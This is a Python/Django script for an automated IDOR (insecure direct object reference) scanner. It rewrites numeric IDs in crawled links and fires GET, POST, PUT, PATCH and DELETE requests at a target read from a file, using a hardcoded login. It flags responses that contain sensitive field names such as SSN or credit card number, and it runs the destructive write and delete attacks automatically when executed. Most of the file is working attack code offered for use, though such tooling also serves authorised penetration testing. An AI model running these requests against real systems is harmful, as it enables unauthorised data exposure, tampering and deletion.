from curses.ascii import isdigit
import os, django, re, sys
from platform import machine
BASE_DIR = os.path.dirname(os.path.abspath('./Wrapper'))
sys.path.append(BASE_DIR)
os.environ['DJANGO_SETTINGS_MODULE'] = 'Wrapper.settings'
django.setup()
from common import main_common_pattern_to_traverse_a_website as MAIN_COMMON_PATTERN
from django.db import transaction

os.system("clear")

import requests
from core.models import LinkActionItem, LinkActionItemPost, LinkActionItemResponse, FormItem, FormDetailsItem, LinkItem

def _get_url():
    os.chdir('idord_infograther')
    file= open("link_to_crawl.txt","r")
    try:
        return file.readline()

    except:
        return None

BASE_LINK = _get_url()

def _get_api():
    api = BASE_LINK.split("/")
    
    return [f"http://api.0.0.0.0:3000","http://localhost:5000","http://localhost:5001",
                        "http://localhost:5002","http://localhost:5003","http://localhost:5004",
                        "http://localhost:5005","http://localhost:5006"]

API_LINKS = _get_api()

LOGIN_LINK = ['login','Login','signin','sessions']
SANSATIVE_INFO = ["social security numbers","ssn", "driver license number", "financial identifiers", "citizen visa code","test scores", "Biometric identifiers", "Account balances", "Bank account number", "credit card number", "payment history", "income history", "expiration","CVV","CVV2","PIN","BIN"]
    
def has_numbers(inputString):
    return any(char.isdigit() for char in inputString)



@transaction.atomic
def generateAttack():

    for link in LinkItem.objects.all():
        if(has_numbers(link.link)):

            # full_link = BASE_LINK+str(link.link)
            matching = re.split("\W+",str(link.link))
            # print(','.join(out))
            for i in range(len(matching)):
                
                original= matching[i]
                
                try:
                    if isdigit(original):
                        for j in range(10):
                            matching[i]=str(j)
                            obj = LinkActionItem.objects.create(link=BASE_LINK+'/'.join(matching),orginal_param=original,manupulated_param=matching[i])
                            #print(obj)
                            obj.save()
                            for API_LINK in API_LINKS:
                                obj2 = LinkActionItem.objects.create(link=API_LINK+'/'.join(matching),orginal_param=original,manupulated_param=matching[i])
                                #print(obj2)
                                obj2.save()

                except Exception as e:        
                    pass
    try:
        for API_LINK in API_LINKS:
            for i in MAIN_COMMON_PATTERN:
                for j in range(10):
                    
                    
                    try:
                        obj2 = LinkActionItem.objects.create(link=(API_LINK+'/'+str(i)+'/'+str(j)),manupulated_param=str(j))
                        obj2.save()
                    except:
                        pass

    except Exception as e:
        pass
    
    
    try:
        for API_LINK in API_LINKS:
            for i in MAIN_COMMON_PATTERN:
                #print(API_LINK+'/'+str(i))
                try:
                    obj4 = LinkActionItemPost.objects.create(link=(API_LINK+'/'+str(i)))
                    obj4.save()
                except:
                    pass

    except Exception as e:
        pass
            
generateAttack()

def checkSansativeInfo(html_page):
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_page, 'html.parser')
    result = []
    for th in soup.find_all('th'):
        for sn in SANSATIVE_INFO:
            if str(th.text).lower() == sn:
               result.append(sn) 

    for th in soup.find_all('p'):
        for sn in SANSATIVE_INFO:
            if str(th.text).lower() == sn:
                result.append(sn)


    for th in soup.find_all('td'):
        for sn in SANSATIVE_INFO:
            if str(th.text).lower() == sn:
                result.append(sn)
    

    for th in soup.find_all('header'):
        for sn in SANSATIVE_INFO:
            if str(th.text).lower() == sn:
                result.append(sn)
    
    for th in soup.find_all('script'):
        for sn in SANSATIVE_INFO:
            if str(th.text).lower() == sn:
                result.append(sn)

    return result



def get_attack():
    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'email':'a@a.com','password':'ashikashik'}
    session = requests.Session()

    #login scripts
    r = ""
    for i in LOGIN_LINK:
        r = session.post(BASE_LINK+f"/{i}/",headers=headers,data=payload)
        if(r.status_code==200):
            r = r 
            break
    header = dict(r.headers)

    linkActionItem = LinkActionItem.objects.all()
    for actionItem in linkActionItem:

        try:
            data = session.get(actionItem.link,headers={'Set-Cookie':header['Set-Cookie'],'X-Request-Id':header['X-Request-Id']})
            if data.text is not None:
                result = checkSansativeInfo(data.text)
                
                if len(result)>0:
                    print(actionItem.link)
                    print(f"________IDOR__________GET")
                    #LinkActionItemResponse.objects.create(action=actionItem,status="get_idor",effected_full_page=data.text)
                    print("___________________________________________________")
        except Exception as e:
            pass

def attack():
    
    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'email':'a@a.com','password':'ashikashik'}

    session = requests.Session()
    r = session.post(BASE_LINK+'/sessions/',headers=headers,data=payload)

    header = dict(r.headers)
    d = session.get(BASE_LINK+"/dashboard/home",headers={'Set-Cookie':header['Set-Cookie'],'X-Request-Id':header['X-Request-Id']})



def post_attack():
    links  = LinkActionItemPost.objects.all()

    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'title':'actualHack on post method','name':'actualHackName on post method'}
    session = requests.Session()

   
    for l in links:
        try:
            r = session.post(l.link,headers=headers,data=payload)
            if r.status_code == 201:
                
                print(f"________IDOR__________POST : {l.link}")
                LinkActionItemResponse.objects.create(action="post",action_link = l.link,status="post_idor",tag="Hacker Can create a new entry in your database")
                print("___________________________________________________")
        except:
            pass
        # if(r.status_code==200):
        #     r = r 
        #     break




def put_attack():
    links  = LinkActionItem.objects.all()

    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'title':'actualHack on put method','name':'actualHackName on put method'}
    session = requests.Session()

   
    for l in links:
        try:
            
            r = session.put(l.link,headers=headers,data=payload)
            # print(l.link,r.status_code)
            if r.status_code ==200:
                
                print(f"________IDOR__________PUT : {l.link}")
                LinkActionItemResponse.objects.create(action="put",action_link = l.link,status="put_idor",tag="Hacker Can changes your database")
                print("___________________________________________________")
        except:
            pass




def patch_attack():
    links  = LinkActionItem.objects.all()

    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'title':'actualHack on patch method','name':'actualHackName on patch method'}
    session = requests.Session()

   
    for l in links:
        try:
            r = session.patch(l.link,headers=headers,data=payload)
            if r.status_code == 200:
                
                print(f"________IDOR__________patch : {l.link}")
                LinkActionItemResponse.objects.create(action="patch",action_link = l.link,status="patch_idor",tag="Hacker Can changes your database")
                print("___________________________________________________")
        except:
            pass



def delete_attack():
    links  = LinkActionItem.objects.all()

    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'title':'actualHack on delete method','name':'actualHackName on delete method'}
    session = requests.Session()

   
    for l in links:
        try:
            r = session.delete(l.link,headers=headers)
            if r.status_code == 200:
                
                print(f"________IDOR__________Delete : {l.link}")
                LinkActionItemResponse.objects.create(action="delete",action_link = l.link,status="delete_idor",tag="Hacker Can delete your database entry")
                print("___________________________________________________")
        except:
            pass
        # if(r.status_code==200):
        #     r = r 
        #     break


post_attack()
put_attack()
patch_attack()
delete_attack()

# get_attack()